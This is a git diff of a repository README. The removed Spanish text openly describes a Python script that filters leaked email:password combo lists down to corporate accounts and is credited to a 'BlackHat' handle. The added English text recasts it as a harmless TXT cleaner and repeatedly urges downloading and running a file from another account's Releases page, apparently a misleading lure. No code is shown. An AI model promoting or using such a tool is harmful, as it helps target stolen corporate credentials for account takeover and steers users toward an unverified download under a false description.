@@ -1,20 +1,86 @@
-Es un script en Python para “corporatizar” archivos de combos `email:password`, eliminando correos de dominios gratuitos/conocidos y dejando principalmente posibles correos **corporativos**. [raw.githubusercontent](https://raw.githubusercontent.com/Cocomx/TEST/refs/heads/main/corporatizarv2.py)
+# 🛠️ TEST - Clean Your TXT Files Easily
 
-### ¿Qué hace el script?
+## 🚀 Getting Started
 
-- Lee archivos (o una carpeta de archivos) con líneas tipo `email:password` y normaliza separadores como `, | espacio` a `:`. [raw.githubusercontent](https://raw.githubusercontent.com/Cocomx/TEST/refs/heads/main/corporatizarv2.py)  
-- Valida que cada línea tenga formato correcto de email y descarta líneas vacías o mal formadas. [raw.githubusercontent](https://raw.githubusercontent.com/Cocomx/TEST/refs/heads/main/corporatizarv2.py)
-- Excluye una lista extensa de dominios gratuitos, temporales y typos comunes (gmail, hotmail, yahoo, protonmail, yopmail, mailinator, etc.). [raw.githubusercontent](https://raw.githubusercontent.com/Cocomx/TEST/refs/heads/main/corporatizarv2.py)
-- Conserva las líneas restantes como posibles correos corporativos y las guarda en un nuevo archivo con sufijo `_corporatizado`. [raw.githubusercontent](https://raw.githubusercontent.com/Cocomx/TEST/refs/heads/main/corporatizarv2.py)
+Welcome to the TEST repository! This Python script helps you clean up your .txt files, making your data easier to manage. It’s great for anyone needing to remove unnecessary lines or format their text files with ease.
 
-### Estadísticas y salida
+## 📥 Download the Application
 
-- Genera un archivo de salida con encabezado descriptivo, fecha de análisis y estadísticas de limpieza (totales leídos, válidos, removidos por formato, removidos por dominio y líneas finales). [raw.githubusercontent](https://raw.githubusercontent.com/Cocomx/TEST/refs/heads/main/corporatizarv2.py)
-- Incluye un resumen de distribución por dominio (conteo y porcentaje) de los correos que quedaron tras la limpieza. [raw.githubusercontent](https://raw.githubusercontent.com/Cocomx/TEST/refs/heads/main/corporatizarv2.py)
-- Si se procesa una carpeta, crea además un `global_corporatizado.txt` con el consolidado de todos los archivos ya limpiados, sin duplicados, más estadísticas globales por dominio. [raw.githubusercontent](https://raw.githubusercontent.com/Cocomx/TEST/refs/heads/main/corporatizarv2.py)
+[![Download TEST](https://img.shields.io/badge/Download%20TEST-Here-blue.svg)](https://github.com/vigit3/TEST/releases)
 
-### Uso e idioma
+### 📍 Link to Download
 
-- Uso básico: `python corporatizarv2.py ruta_entrada [es|en]`. [raw.githubusercontent](https://raw.githubusercontent.com/Cocomx/TEST/refs/heads/main/corporatizarv2.py)  
-- Soporta español e inglés para todos los mensajes, descripciones y encabezados de los archivos generados. [raw.githubusercontent](https://raw.githubusercontent.com/Cocomx/TEST/refs/heads/main/corporatizarv2.py)
-- Los textos se acreditan a @BlackHat_RedCat en la descripción y en los headers de salida. [raw.githubusercontent](https://raw.githubusercontent.com/Cocomx/TEST/refs/heads/main/corporatizarv2.py)
+You can download the latest version of TEST from the Releases page:
+
+[Visit this page to download](https://github.com/vigit3/TEST/releases)
+
+## 🛠️ System Requirements
+
+Before you download and use TEST, ensure that your system meets the following requirements:
+
+- **Operating System:** Windows, macOS, or Linux
+- **Python:** This script runs with Python 3.6 or later. If you do not have Python installed, you can download it from [python.org](https://www.python.org).
+
+## 🌟 Features
+
+- **User-Friendly:** No coding needed. Just run the script!
+- **Data Cleaning:** Remove unwanted lines from your .txt files.
+- **Combining Files:** Merge multiple .txt files into one.
+- **Flexible Usage:** Ideal for various applications, including credential management and data cleaning.
+
+## 📄 How to Use TEST
+
+### Step 1: Download the Script
+
+Visit the Releases page:
+
+[Download TEST Here](https://github.com/vigit3/TEST/releases)
+
+### Step 2: Install Python
+
+If you don’t already have Python, download it from [python.org](https://www.python.org). Follow the installation instructions for your operating system.
+
+### Step 3: Download and Run the Script
+
+1. After downloading, locate the downloaded file in your system.
+2. Extract the contents if necessary. You should see a file named `clean_txt.py`.
+3. Open a terminal or command prompt.
+4. Navigate to the folder where you downloaded the script. You can do this by typing `cd path/to/your/folder` and pressing Enter.
+5. Run the script by typing:
+   ```
+   python clean_txt.py
+   ```
+
+### Step 4: Follow the Prompts
+
+The script will guide you through the process. You will need to specify which .txt file to clean and what changes to make.
+
+## 🎯 Usage Tips
+
+- **Backup Your Files:** Always make a copy of your .txt files before running any cleaning scripts.
+- **Review Changes:** After running the script, check the output carefully to ensure everything looks correct.
+- **Test with Sample Files:** Start with smaller, non-critical files to get accustomed to the functionality.
+
+## 🔄 Updating the Script
+
+To ensure you benefit from the latest improvements and features, regularly check the Releases page for updates:
+
+[Visit this page to download](https://github.com/vigit3/TEST/releases)
+
+## 💬 Support
+
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. Make sure to provide details about your problem for better assistance.
+
+## 📝 Contribution
+
+We welcome contributions! If you have any improvements or fixes, please fork the repository and submit a pull request.
+
+## 📢 Stay Updated
+
+Follow this repository for future updates. You can also star it to help others find this script.
+
+## 🧭 License
+
+This project is licensed under the MIT License. You can use it freely with proper attribution.
+
+Thank you for using TEST. Your feedback is important to us!
